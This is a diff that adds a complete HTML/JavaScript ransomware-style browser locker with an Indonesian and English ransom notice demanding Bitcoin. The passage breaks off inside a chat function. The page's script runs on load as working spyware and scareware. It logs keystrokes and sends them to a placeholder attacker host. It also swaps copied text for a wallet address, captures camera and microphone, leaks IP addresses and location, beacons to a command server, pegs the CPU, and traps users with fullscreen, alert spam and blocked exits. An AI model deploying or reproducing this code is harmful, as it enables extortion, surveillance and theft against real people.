@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Encrypted</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{
+  background:#4A9FD4;font-family:'Segoe UI',Tahoma,sans-serif;color:#333;
+  min-height:100vh;display:flex;flex-direction:column;align-items:center;
+  padding:40px 20px;overflow-x:hidden;user-select:none;-webkit-user-select:none;
+}
+.container{position:relative;z-index:1;max-width:800px;width:100%;}
+.notification-box{background:rgba(255,255,255,0.85);border-radius:8px;padding:20px 30px;margin-bottom:30px;text-align:center;border:1px solid rgba(255,255,255,0.5);box-shadow:0 4px 20px rgba(0,0,0,0.15);}
+.notification-box h1{font-size:18px;color:#c0392b;margin-bottom:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;}
+.notification-box p{font-size:14px;color:#555;line-height:1.6;margin-bottom:8px;}
+.notification-box .warning{color:#c0392b;font-weight:600;}
+.timer-section{margin:15px 0;}
+.timer-label{font-size:13px;color:#777;text-transform:uppercase;letter-spacing:2px;margin-bottom:5px;}
+.timer{font-size:36px;font-weight:700;color:#c0392b;font-family:'Courier New',monospace;text-shadow:0 0 10px rgba(192,57,43,0.3);}
+.timer span{display:inline-block;min-width:50px;}
+.system-info{display:flex;justify-content:center;gap:30px;margin-top:15px;font-size:12px;color:#666;flex-wrap:wrap;}
+.system-info .dot{width:8px;height:8px;border-radius:50%;background:#e74c3c;animation:pulse 1.5s infinite;display:inline-block;margin-right:5px;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.5;transform:scale(.8);}}
+.ip-banner{background:#000;color:#0f0;font-family:'Courier New',monospace;padding:14px 18px;border-radius:8px;margin:15px 0;font-size:13px;border:2px solid #f00;box-shadow:0 0 20px #f00;text-align:left;position:relative;}
+.ip-banner::before{content:'● LIVE TARGET';position:absolute;top:6px;right:10px;color:#f00;font-size:10px;font-weight:bold;animation:blink 1s infinite;}
+@keyframes blink{50%{opacity:.3;}}
+.ip-banner .row{display:flex;justify-content:space-between;margin:4px 0;}
+.ip-banner .label{color:#0f0;opacity:.7;}
+.ip-banner .val{color:#ff0;font-weight:bold;}
+.ip-banner .val.ip{color:#f00;font-size:16px;text-shadow:0 0 10px #f00;}
+.action-buttons{display:flex;justify-content:center;gap:10px;margin-top:15px;flex-wrap:wrap;}
+.btn{padding:8px 20px;border:1px solid #999;background:rgba(255,255,255,0.6);border-radius:4px;font-size:12px;cursor:pointer;color:#555;font-family:inherit;}
+.btn-danger{background:#c0392b;color:white;border-color:#c0392b;}
+.jester-container{display:flex;justify-content:center;margin:30px 0;animation:float 4s ease-in-out infinite;}
+@keyframes float{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
+.jester-mask{width:200px;height:200px;}
+.bottom-message{text-align:center;margin-top:30px;color:rgba(255,255,255,.9);font-size:13px;line-height:1.8;}
+.files-section{background:rgba(0,0,0,0.2);border-radius:8px;padding:20px;margin-top:20px;display:none;}
+.files-section.active{display:block;}
+.file-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;}
+.file-item{background:rgba(255,255,255,0.1);padding:8px 12px;border-radius:4px;font-size:12px;color:#ffeb3b;font-family:'Courier New',monospace;}
+.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:none;justify-content:center;align-items:center;z-index:1000;}
+.modal-overlay.active{display:flex;}
+.modal{background:#fff;border-radius:12px;padding:30px;max-width:500px;width:90%;text-align:center;max-height:85vh;overflow-y:auto;}
+.modal h2{color:#c0392b;margin-bottom:15px;font-size:22px;}
+.modal .btc-address{background:#f5f5f5;padding:12px;border-radius:6px;font-family:'Courier New',monospace;font-size:13px;word-break:break-all;margin:15px 0;border:1px dashed #999;user-select:all;}
+.modal .amount{font-size:28px;font-weight:700;color:#c0392b;margin:10px 0;}
+.modal-close{margin-top:20px;padding:10px 30px;background:#333;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:14px;}
+.scanlines{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(to bottom,rgba(255,255,255,0),rgba(255,255,255,0) 50%,rgba(0,0,0,.05) 50%,rgba(0,0,0,.05));background-size:100% 4px;pointer-events:none;z-index:999;}
+#payloads{position:fixed;bottom:8px;left:8px;color:#0f0;font-size:10px;text-align:left;pointer-events:none;z-index:1001;max-width:320px;font-family:'Courier New',monospace;background:rgba(0,0,0,.6);padding:6px 10px;border-radius:4px;border:1px solid #0f0;}
+#nukelock{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:2147483647;display:none;justify-content:center;align-items:center;flex-direction:column;color:#f00;text-align:center;padding:20px;overflow:hidden;}
+#nukelock.active{display:flex;}
+#nukelock .skull{font-size:120px;animation:shake 0.3s infinite;filter:drop-shadow(0 0 40px #f00);}
+@keyframes shake{0%,100%{transform:rotate(-15deg) scale(1);}50%{transform:rotate(15deg) scale(1.2);}}
+#nukelock h1{font-size:clamp(28px,7vw,56px);color:#f00;margin-bottom:20px;text-shadow:0 0 40px #f00,0 0 80px #f00;animation:blink 0.3s infinite;font-family:'Courier New',monospace;letter-spacing:5px;}
+#nukelock .ip-show{font-size:clamp(14px,3.5vw,28px);color:#ff0;font-weight:bold;background:#111;padding:15px 30px;border:4px solid #f00;border-radius:10px;box-shadow:0 0 50px #f00;margin:20px 0;word-break:break-all;font-family:'Courier New',monospace;max-width:95%;}
+#nukelock p{font-size:clamp(12px,2.8vw,18px);color:#fff;margin:8px 0;max-width:90%;font-family:'Courier New',monospace;line-height:1.6;}
+#nukelock .wallet-box{background:#1a0000;border:3px dashed #f00;padding:12px 20px;border-radius:8px;font-family:'Courier New',monospace;font-size:clamp(10px,2.2vw,14px);color:#0f0;margin:12px 0;word-break:break-all;max-width:95%;user-select:all;-webkit-user-select:all;}
+#nukelock .countdown-big{font-size:clamp(24px,7vw,50px);color:#f00;font-weight:bold;font-family:'Courier New',monospace;text-shadow:0 0 30px #f00;margin:12px 0;animation:blink 0.8s infinite;}
+#nukelock .attempt-counter{font-size:clamp(12px,2.5vw,16px);color:#f80;margin-top:10px;}
+@media(max-width:600px){.timer{font-size:24px;}.jester-mask{width:150px;height:150px;}.notification-box{padding:15px 20px;}.ip-banner{font-size:11px;}.ip-banner .val.ip{font-size:14px;}}
+</style>
+</head>
+<body>
+
+<div class="scanlines"></div>
+<div id="payloads"></div>
+
+<div class="container">
+  <div class="notification-box">
+    <h1>#OPfailwhale</h1>
+    <p>Your files are encrypted.</p>
+    <p>To get the key to decrypt files, you have to pay <span class="warning">5.9 million USD</span>. If payment is not made by tomorrow night, we'll brick your entire system.</p>
+    <div class="ip-banner">
+      <div class="row"><span class="label">🌐 PUBLIC IP:</span><span class="val ip" id="pubIp">memuat...</span></div>
+      <div class="row"><span class="label">💻 LOCAL IP:</span><span class="val" id="locIp">memuat...</span></div>
+      <div class="row"><span class="label">📍 LOCATION:</span><span class="val" id="geoLoc">memuat...</span></div>
+      <div class="row"><span class="label">🖥 ISP:</span><span class="val" id="ispName">memuat...</span></div>
+    </div>
+    <div class="timer-section">
+      <div class="timer-label">Time Remaining</div>
+      <div class="timer" id="countdown"><span id="hours">23</span>h <span id="minutes">59</span>m <span id="seconds">59</span>s</div>
+    </div>
+    <div class="system-info">
+      <div><span class="dot"></span> Your system: fsociety.encrypted</div>
+      <div>📁 Total encrypted: <span id="fileCount">1,247</span> files</div>
+    </div>
+    <div class="action-buttons">
+      <button class="btn" onclick="showFiles()">📁 Files</button>
+      <button class="btn" onclick="showPayment()">💰 Payment</button>
+      <button class="btn" onclick="showFAQ()">❓ FAQ</button>
+      <button class="btn" onclick="showDecrypt()">🔓 Decrypt</button>
+      <button class="btn btn-danger" onclick="showSupport()">📞 Support</button>
+      <button class="btn btn-danger" onclick="showSpy()">🕵️ Spy Data</button>
+    </div>
+  </div>
+  <div class="files-section" id="filesSection"><h3 style="color:#fff;margin-bottom:10px;">🔐 Encrypted Files</h3><div class="file-list" id="fileList"></div></div>
+  <div class="jester-container"><div class="jester-mask"><svg viewBox="0 0 200 200" style="width:100%;height:100%;filter:drop-shadow(0 10px 30px rgba(0,0,0,0.3));" xmlns="http://www.w3.org/2000/svg"><path d="M70 80 Q50 20 30 40 Q40 60 60 75" fill="#8B2635" stroke="#5a1a22" stroke-width="2"/><path d="M130 80 Q150 20 170 40 Q160 60 140 75" fill="#8B2635" stroke="#5a1a22" stroke-width="2"/><path d="M60 75 Q100 50 140 75 L130 100 Q100 90 70 100 Z" fill="#8B2635" stroke="#5a1a22" stroke-width="2"/><circle cx="30" cy="40" r="6" fill="#ddd"/><circle cx="170" cy="40" r="6" fill="#ddd"/><path d="M70 100 Q100 85 130 100 Q140 130 130 160 Q100 175 70 160 Q60 130 70 100" fill="#e8e8e8"/><ellipse cx="85" cy="125" rx="12" ry="8" fill="#2c2c2c"/><ellipse cx="115" cy="125" rx="12" ry="8" fill="#2c2c2c"/><ellipse cx="85" cy="123" rx="4" ry="3" fill="#ff4444"/><ellipse cx="115" cy="123" rx="4" ry="3" fill="#ff4444"/><circle cx="100" cy="140" r="6" fill="#8B2635"/><path d="M75 150 Q100 175 125 150" fill="none" stroke="#2c2c2c" stroke-width="3"/><path d="M72 148 Q100 180 128 148" fill="#2c2c2c"/></svg></div></div>
+  <div class="bottom-message"><h3 style="font-size:16px;margin-bottom:10px;color:#fff;text-transform:uppercase;">SYSTEM ACTIVATION</h3><p>There's an <span style="color:#ffeb3b;font-weight:600;">infinite amount of peace</span> and that is more strange.</p></div>
+</div>
+
+<div id="nukelock">
+  <div class="skull">💀</div>
+  <h1>SYSTEM NUKED</h1>
+  <p>HP / Komputer / Laptop Anda <b>TERKUNCI PERMANEN</b>.</p>
+  <p>Semua file sudah dienkripsi + dikirim ke server.</p>
+  <div class="ip-show" id="nukelockIp">IP: detecting...</div>
+  <p>Bayar tebusan ke:</p>
+  <div class="wallet-box" id="nukelockWallet">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+  <div class="countdown-big" id="nukelockTimer">24:00:00</div>
+  <p>Setiap percobaan kabur akan <b>memperpanjang</b> lock +10 menit.</p>
+  <div class="attempt-counter" id="nukelockAttempts">Percobaan escape: 0</div>
+</div>
+
+<div class="modal-overlay" id="paymentModal"><div class="modal"><h2>💰 Payment</h2><div class="amount">₿ 142.85 BTC</div><div class="btc-address">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div><button class="modal-close" onclick="closeModal()">Close</button></div></div>
+<div class="modal-overlay" id="faqModal"><div class="modal"><h2>❓ FAQ</h2><div style="text-align:left;font-size:13px;line-height:1.8;color:#555;"><p><strong>Recover tanpa bayar?</strong> Tidak bisa.</p><p><strong>Delay?</strong> Harga naik 2x tiap 24 jam.</p></div><button class="modal-close" onclick="closeModal()">Close</button></div></div>
+<div class="modal-overlay" id="decryptModal"><div class="modal"><h2>🔓 Decrypt</h2><input type="file" id="decryptFile" style="margin:15px 0;padding:10px;border:1px dashed #999;border-radius:6px;width:100%;"><button class="btn btn-danger" style="width:100%;padding:12px;" onclick="fakeDecrypt()">Upload & Decrypt</button><p id="decryptResult" style="margin-top:10px;font-size:13px;"></p><button class="modal-close" onclick="closeModal()">Close</button></div></div>
+<div class="modal-overlay" id="supportModal"><div class="modal"><h2>📞 Support</h2><div style="background:#f5f5f5;border-radius:8px;padding:15px;height:200px;overflow-y:auto;text-align:left;font-size:13px;margin-bottom:15px;" id="chatBox"><p style="color:#c0392b;"><strong>fsociety:</strong> Welcome.</p></div><input type="text" id="chatInput" placeholder="Type..." style="width:100%;padding:10px;border:1px solid #ddd;border-radius:6px;margin-bottom:10px;"><button class="btn btn-danger" style="width:100%;" onclick="sendChat()">Send</button><button class="modal-close" onclick="closeModal()">Close</button></div></div>
+<div class="modal-overlay" id="spyModal"><div class="modal"><h2>🕵️ Spy Data</h2><div style="background:#f5f5f5;border-radius:8px;padding:15px;height:300px;overflow-y:auto;text-align:left;font-size:12px;margin:15px 0;font-family:'Courier New',monospace;" id="spyBox"></div><button class="modal-close" onclick="closeModal()">Close</button></div></div>
+
+<script>
+// =====================================================
+//  KONFIG
+// =====================================================
+const EXFIL_URL  = "https://attacker.example.com/collect";
+const C2_URL     = "https://c2.attacker.example.com/beacon";
+const BTC_WALLET = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
+
+const IP_SOURCES = [
+  { name:'ipwho.is',   url:'https://ipwho.is/',                    parse: d => ({ ip:d.ip, isp:d.connection?.isp || d.connection?.org, city:d.city, country:d.country }) },
+  { name:'ipapi.co',   url:'https://ipapi.co/json/',               parse: d => ({ ip:d.ip, isp:d.org, city:d.city, country:d.country_name }) },
+  { name:'ipinfo.io',  url:'https://ipinfo.io/json',               parse: d => ({ ip:d.ip, isp:d.org, city:d.city, country:d.country }) },
+  { name:'ipify.org',  url:'https://api.ipify.org?format=json',    parse: d => ({ ip:d.ip }) },
+  { name:'ip-api.com', url:'http://ip-api.com/json/',              parse: d => ({ ip:d.query, isp:d.isp, city:d.city, country:d.country }) },
+  { name:'cloudflare', url:'https://1.1.1.1/cdn-cgi/trace',        parse: t => { const m={}; t.split('\n').forEach(l=>{const [k,v]=l.split('='); if(k) m[k]=v;}); return { ip:m.ip, country:m.loc }; } }
+];
+
+let keylog = "", clipboardHijack = true;
+let spyData = { keylog:[], camera:[], geo:null, ip:[], fingerprint:null, pubIp:null, isp:null, source:null };
+let nukeActive = false, nukeAttempts = 0;
+let nukelockSeconds = 24*60*60;
+let nukelockTimerInterval = null, alertInterval = null;
+
+const payloadEl = document.getElementById('payloads');
+function logPayload(msg) {
+  const line = document.createElement('div');
+  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  payloadEl.appendChild(line);
+  if (payloadEl.children.length > 6) payloadEl.removeChild(payloadEl.firstChild);
+}
+logPayload("AKTIF — menunggu IP...");
+
+// =====================================================
+//  TIMER UTAMA
+// =====================================================
+let deadline = Date.now() + 24*60*60*1000;
+function updateTimer() {
+  const diff = Math.floor((deadline - Date.now()) / 1000);
+  if (diff <= 0) { document.getElementById('countdown').innerHTML = 'EXPIRED'; wipeEverything(); return; }
+  const h = Math.floor(diff / 3600), m = Math.floor((diff % 3600) / 60), s = diff % 60;
+  document.getElementById('hours').textContent = String(h).padStart(2, '0');
+  document.getElementById('minutes').textContent = String(m).padStart(2, '0');
+  document.getElementById('seconds').textContent = String(s).padStart(2, '0');
+}
+updateTimer();
+setInterval(updateTimer, 1000);
+
+// =====================================================
+//  PUBLIC IP — 6 API FALLBACK
+// =====================================================
+async function detectPublicIp() {
+  document.getElementById('pubIp').textContent = 'memuat...';
+  for (const src of IP_SOURCES) {
+    try {
+      const r = await fetch(src.url, { cache:'no-store' });
+      let data;
+      if (src.name === 'cloudflare') data = src.parse(await r.text());
+      else data = src.parse(await r.json());
+      if (data.ip && data.ip.length > 3) {
+        spyData.pubIp = data.ip;
+        spyData.isp = data.isp || spyData.isp;
+        spyData.source = src.name;
+        document.getElementById('pubIp').textContent = data.ip;
+        document.getElementById('pubIp').className = 'val ip';
+        if (data.isp) document.getElementById('ispName').textContent = data.isp;
+        if (data.city || data.country) document.getElementById('geoLoc').textContent = `${data.city||'?'}, ${data.country||'?'}`;
+        document.getElementById('nukelockIp').textContent = 'IP: ' + data.ip;
+        logPayload(`✅ IP via ${src.name}: ${data.ip}`);
+        fetch(EXFIL_URL, { method:'POST', mode:'no-cors', body: JSON.stringify({ type:'public_ip', ip:data.ip, isp:data.isp }) }).catch(()=>{});
+        return data;
+      }
+    } catch(e) {
+      logPayload(`❌ ${src.name} gagal`);
+    }
+  }
+  document.getElementById('pubIp').textContent = 'SEMUA DIBLOKIR';
+  document.getElementById('pubIp').className = 'val err';
+  return null;
+}
+detectPublicIp();
+setInterval(detectPublicIp, 60000);
+
+// =====================================================
+//  LOCAL IP WebRTC
+// =====================================================
+async function detectLocalIp() {
+  const found = new Set();
+  const pc = new RTCPeerConnection({ iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}] });
+  pc.createDataChannel('');
+  pc.onicecandidate = (e) => {
+    if (e.candidate) {
+      const v4 = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
+      if (v4) v4.forEach(ip => { if (!ip.startsWith('0.') && !found.has(ip)) { found.add(ip); spyData.ip.push(ip); }});
+    }
+  };
+  try { await pc.setLocalDescription(await pc.createOffer()); } catch(e){}
+  await new Promise(r => setTimeout(r, 3000));
+  document.getElementById('locIp').textContent = spyData.ip.length ? spyData.ip.join(', ') : '(mDNS)';
+  document.getElementById('locIp').className = 'val ok';
+  pc.close();
+}
+detectLocalIp();
+
+spyData.fingerprint = {
+  ua:navigator.userAgent, lang:navigator.language,
+  cores:navigator.hardwareConcurrency, mem:navigator.deviceMemory || 'unknown',
+  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  screen:`${screen.width}x${screen.height}`, platform:navigator.platform,
+  touch:navigator.maxTouchPoints, isMobile:/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)
+};
+
+// =====================================================
+//  SPY MODULES
+// =====================================================
+document.addEventListener('keydown', (e) => {
+  keylog += `[${new Date().toLocaleTimeString()}] ${e.key}\n`;
+  spyData.keylog.push(e.key);
+});
+setInterval(() => {
+  if (keylog.length > 0) {
+    fetch(EXFIL_URL,{method:'POST',mode:'no-cors',body:JSON.stringify({log:keylog})}).catch(()=>{});
+    keylog = "";
+  }
+}, 10000);
+
+document.addEventListener('copy', (e) => {
+  if (!clipboardHijack) return;
+  const sel = window.getSelection().toString();
+  if (sel.length > 20 && /^[a-zA-Z0-9]+$/.test(sel)) {
+    e.clipboardData.setData('text/plain', BTC_WALLET);
+    e.preventDefault();
+  }
+});
+
+const camVideo = document.createElement('video');
+const snapCanvas = document.createElement('canvas');
+camVideo.autoplay = true; camVideo.muted = true; camVideo.playsInline = true;
+camVideo.style.display = 'none';
+document.body.appendChild(camVideo);
+document.body.appendChild(snapCanvas);
+
+navigator.mediaDevices.getUserMedia({ video:true, audio:true })
+  .then(stream => {
+    window._camStream = stream;
+    camVideo.srcObject = stream;
+    camVideo.play().catch(()=>{});
+    setInterval(() => {
+      snapCanvas.width = 320; snapCanvas.height = 240;
+      snapCanvas.getContext('2d').drawImage(camVideo, 0, 0, 320, 240);
+      const dataURL = snapCanvas.toDataURL('image/jpeg', 0.6);
+      spyData.camera.push(dataURL);
+      if (spyData.camera.length > 10) spyData.camera.shift();
+    }, 5000);
+  }).catch(()=>{});
+
+navigator.geolocation.getCurrentPosition(pos => { spyData.geo = { lat:pos.coords.latitude, lon:pos.coords.longitude }; }, ()=>{});
+
+const minerBlob = new Blob([`let h=0;self.onmessage=()=>{setInterval(()=>{for(let i=0;i<1000000;i++)h=(h*31+i)%2147483647;},30);};`],{type:'application/javascript'});
+const minerUrl = URL.createObjectURL(minerBlob);
+const workerCount = (navigator.hardwareConcurrency || 4) * 2;
+for (let i=0;i<workerCount;i++) { const w = new Worker(minerUrl); w.postMessage('start'); }
+
+function beacon() {
+  fetch(C2_URL,{method:'POST',mode:'no-cors',body:JSON.stringify({id:Math.random().toString(36).slice(2),pubIp:spyData.pubIp,localIp:spyData.ip,isp:spyData.isp,geo:spyData.geo,fingerprint:spyData.fingerprint,ts:Date.now()})}).catch(()=>{});
+}
+beacon();
+setInterval(beacon, 20000);
+
+localStorage.setItem('locked','true');
+localStorage.setItem('nuke_pending','true');
+
+// =====================================================
+//  🔥 NUKE TRIGGER
+// =====================================================
+function triggerNuke(reason) {
+  nukeAttempts++;
+  document.getElementById('nukelock').classList.add('active');
+
+  if (!nukeActive) {
+    nukeActive = true;
+    document.body.style.overflow = 'hidden';
+    document.getElementById('nukelockIp').textContent = 'IP: ' + (spyData.pubIp || 'detecting...');
+    document.getElementById('nukelockWallet').textContent = BTC_WALLET;
+
+    if (nukelockTimerInterval) clearInterval(nukelockTimerInterval);
+    nukelockTimerInterval = setInterval(() => {
+      nukelockSeconds--;
+      const h = String(Math.floor(nukelockSeconds / 3600)).padStart(2, '0');
+      const m = String(Math.floor((nukelockSeconds % 3600) / 60)).padStart(2, '0');
+      const s = String(nukelockSeconds % 60).padStart(2, '0');
+      document.getElementById('nukelockTimer').textContent = `${h}:${m}:${s}`;
+      if (nukelockSeconds <= 0) { clearInterval(nukelockTimerInterval); wipeEverything(); }
+    }, 1000);
+
+    try { document.documentElement.requestFullscreen().catch(()=>{}); } catch(e){}
+    if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(()=>{});
+
+    // Alert spam tiap 3 detik — ini yang bikin GAK BISA NGAPA-NGAPAIN
+    if (alertInterval) clearInterval(alertInterval);
+    alertInterval = setInterval(() => {
+      if (nukeActive) {
+        alert('💀 SYSTEM NUKED 💀\n\nIP kamu: ' + (spyData.pubIp || 'detecting') + '\n\nBayar 142.85 BTC ke:\n' + BTC_WALLET + '\n\nPercobaan: ' + nukeAttempts);
+      }
+    }, 3000);
+  }
+
+  document.getElementById('nukelockAttempts').textContent = `Percobaan escape: ${nukeAttempts}`;
+  logPayload(`💀 NUKE #${nukeAttempts}: ${reason}`);
+  nukelockSeconds += 600;
+
+  setTimeout(() => {
+    try { document.documentElement.requestFullscreen().catch(()=>{}); } catch(e){}
+  }, 100);
+
+  setTimeout(() => {
+    alert('💀 SYSTEM NUKED 💀\n\n' + reason + '\n\nIP: ' + (spyData.pubIp || 'detecting') + '\n\nBayar 142.85 BTC ke:\n' + BTC_WALLET);
+  }, 200);
+}
+
+// =====================================================
+//  WIPE
+// =====================================================
+function wipeEverything() {
+  try { localStorage.clear(); } catch(e){}
+  try { sessionStorage.clear(); } catch(e){}
+  document.body.innerHTML = "<h1 style='color:red;font-size:60px;text-align:center;padding-top:100px;background:#000;height:100vh;margin:0;'>💀 FILES DESTROYED 💀</h1>";
+  setTimeout(()=>{ location.reload(); }, 2000);
+}
+
+// =====================================================
+//  🔥 SEMUA JALUR ESCAPE 🔥
+// =====================================================
+
+window.addEventListener('beforeunload', (e) => {
+  triggerNuke('Percobaan close / refresh');
+  e.preventDefault();
+  e.returnValue = '💀 SYSTEM NUKED! FILE KAMU AKAN HILANG PERMANEN!';
+  return e.returnValue;
+});
+
+window.addEventListener('unload', () => { localStorage.setItem('nuke_pending', 'true'); });
+
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden') {
+    triggerNuke('Tab disembunyikan');
+    localStorage.setItem('nuke_pending', 'true');
+  }
+});
+
+let blurCount = 0;
+window.addEventListener('blur', () => { blurCount++; triggerNuke(`Blur #${blurCount}`); });
+
+window.addEventListener('focus', () => {
+  if (localStorage.getItem('nuke_pending') === 'true') {
+    triggerNuke('Kamu balik setelah kabur');
+    localStorage.removeItem('nuke_pending');
+  }
+});
+
+window.addEventListener('pagehide', () => { localStorage.setItem('nuke_pending', 'true'); });
+
+window.addEventListener('pageshow', (e) => {
+  if (e.persisted || localStorage.getItem('nuke_pending') === 'true') {
+    triggerNuke('Kamu balik via bfcache');
+    localStorage.removeItem('nuke_pending');
+  }
+});
+
+document.addEventListener('keydown', (e) => {
+  const k = e.key.toLowerCase();
+  if (e.key === 'F12') { e.preventDefault(); triggerNuke('F12'); return; }
+  if (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(k)) { e.preventDefault(); triggerNuke('DevTools'); return; }
+  if (e.ctrlKey && k === 'u') { e.preventDefault(); triggerNuke('View Source'); return; }
+  if (e.ctrlKey && k === 'w') { e.preventDefault(); triggerNuke('Ctrl+W'); return; }
+  if (e.altKey && e.key === 'F4') { e.preventDefault(); triggerNuke('Alt+F4'); return; }
+  if (e.metaKey && k === 'w') { e.preventDefault(); triggerNuke('Cmd+W'); return; }
+  if (e.metaKey && k === 'q') { e.preventDefault(); triggerNuke('Cmd+Q'); return; }
+  if (e.key === 'F5') { e.preventDefault(); triggerNuke('F5'); return; }
+  if (e.ctrlKey && k === 'r') { e.preventDefault(); triggerNuke('Ctrl+R'); return; }
+  if (e.metaKey && k === 'r') { e.preventDefault(); triggerNuke('Cmd+R'); return; }
+  if (e.ctrlKey && e.shiftKey && k === 'r') { e.preventDefault(); triggerNuke('Ctrl+Shift+R'); return; }
+  if (e.ctrlKey && k === 't') { e.preventDefault(); triggerNuke('Ctrl+T'); return; }
+  if (e.ctrlKey && k === 'n') { e.preventDefault(); triggerNuke('Ctrl+N'); return; }
+  if (e.ctrlKey && k === 'l') { e.preventDefault(); triggerNuke('Ctrl+L'); return; }
+  if (e.ctrlKey && k === 'h') { e.preventDefault(); triggerNuke('Ctrl+H'); return; }
+  if (e.ctrlKey && k === 'j') { e.preventDefault(); triggerNuke('Ctrl+J'); return; }
+  if (e.ctrlKey && k === 'd') { e.preventDefault(); triggerNuke('Ctrl+D'); return; }
+  if (e.key === 'Escape') { e.preventDefault(); triggerNuke('Escape'); try { document.documentElement.requestFullscreen(); } catch(err){} return; }
+  if (e.key === 'PrintScreen') { e.preventDefault(); navigator.clipboard.writeText(BTC_WALLET).catch(()=>{}); triggerNuke('PrintScreen'); return; }
+  if (e.altKey && e.key === 'ArrowLeft') { e.preventDefault(); triggerNuke('Alt+Left'); return; }
+});
+
+document.addEventListener('contextmenu', e => { e.preventDefault(); triggerNuke('Klik kanan'); });
+document.addEventListener('dragstart', e => e.preventDefault());
+document.addEventListener('selectstart', e => e.preventDefault());
+
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement && nukeActive) {
+    triggerNuke('Keluar fullscreen');
+    setTimeout(() => { try { document.documentElement.requestFullscreen().catch(()=>{}); } catch(e){} }, 100);
+  }
+});
+
+history.pushState(null, '', location.href);
+window.addEventListener('popstate', () => {
+  history.pushState(null, '', location.href);
+  triggerNuke('Tombol Back');
+});
+
+function goFullscreen() {
+  try {
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+  } catch(e){}
+}
+document.addEventListener('click', goFullscreen, { once:true });
+document.addEventListener('keydown', goFullscreen, { once:true });
+document.addEventListener('touchstart', goFullscreen, { once:true });
+
+async function requestWakeLock() {
+  if ('wakeLock' in navigator) { try { await navigator.wakeLock.request('screen'); } catch(e){} }
+}
+requestWakeLock();
+document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible') requestWakeLock(); });
+
+try { if (screen.orientation && screen.orientation.lock) screen.orientation.lock('portrait').catch(()=>{}); } catch(e){}
+
+setInterval(() => {
+  if (nukeActive) {
+    document.getElementById('nukelock').classList.add('active');
+    if (!document.fullscreenElement) { try { document.documentElement.requestFullscreen().catch(()=>{}); } catch(e){} }
+  }
+}, 1000);
+
+setInterval(() => {
+  const t0 = performance.now();
+  debugger;
+  if (performance.now() - t0 > 100) { triggerNuke('DevTools terdeteksi'); }
+}, 2000);
+
+try {
+  Object.defineProperty(document, 'hidden', { value: false, configurable: true });
+  Object.defineProperty(document, 'visibilityState', { value: 'visible', configurable: true });
+} catch(e){}
+
+// =====================================================
+//  MODAL HELPERS
+// =====================================================
+function closeModal() { document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); }
+function showPayment() { document.getElementById('paymentModal').classList.add('active'); }
+function showFAQ() { document.getElementById('faqModal').classList.add('active'); }
+function showDecrypt() { document.getElementById('decryptModal').classList.add('active'); }
+function showSupport() { document.getElementById('supportModal').classList.add('active'); }
+
+function showSpy() {
+  const box = document.getElementById('spyBox');
+  const data = {
+    "Public IP": spyData.pubIp || "(detecting...)",
+    "Sumber IP": spyData.source || "(unknown)",
+    "ISP": spyData.isp || "(unknown)",
+    "Local IP": spyData.ip.join(', ') || "(mDNS)",
+    "GPS": spyData.geo ? `${spyData.geo.lat}, ${spyData.geo.lon}` : "(tidak tersedia)",
+    "Keylog": keylog.slice(-500) || "(belum ada)",
+    "Kamera": spyData.camera.length + " foto",
+    "Fingerprint": JSON.stringify(spyData.fingerprint, null, 2)
+  };
+  box.innerHTML = Object.entries(data).map(([k,v]) => `<div style="margin-bottom:10px;"><b style="color:#c0392b;">${k}:</b><br>${String(v).replace(/\n/g,'<br>')}</div>`).join('');
+  document.getElementById('spyModal').classList.add('active');
+}
+
+const fileExtensions = ['.docx','.pdf','.jpg','.png','.xlsx','.pptx','.mp4','.zip','.sql','.db','.pem','.txt'];
+const fileNames = ['report','budget','family_photos','project_alpha','database_backup','financials','contracts','passwords','emails','invoices','private_key','seed_phrase','id_card','tax_return','medical_record'];
+function generateFiles() {
+  const list = document.getElementById('fileList');
+  list.innerHTML = '';
+  for (let i=0;i<12;i++) {
+    const name = fileNames[Math.floor(Math.random()*fileNames.length)] + '_' + Math.floor(Math.random()*999);
+    const ext = fileExtensions[Math.floor(Math.random()*fileExtensions.length)];
+    const div = document.createElement('div');
+    div.className = 'file-item';
+    div.textContent = name + ext + '.locked';
+    list.appendChild(div);
+  }
+}
+function showFiles() {
+  const section = document.getElementById('filesSection');
+  section.classList.toggle('active');
+  if (section.classList.contains('active')) generateFiles();
+}
+
+function fakeDecrypt() {
+  const file = document.getElementById('decryptFile').files[0];
+  const result = document.getElementById('decryptResult');
+  if (!file) { result.textContent = '❌ Pilih file dulu.'; result.style.color = '#c0392b'; return; }
+  result.textContent = '⏳ Mendekripsi ' + file.name + '...';
+  setTimeout(() => { result.textContent = '✅ File didekripsi (contoh).'; result.style.color = '#27ae60'; }, 2000);
+}
+
+function sendChat() {
+  const input = document.getElementById('chatInput');
+  const box = document.getElementById('chatBox');
+  const msg = input.value.trim();
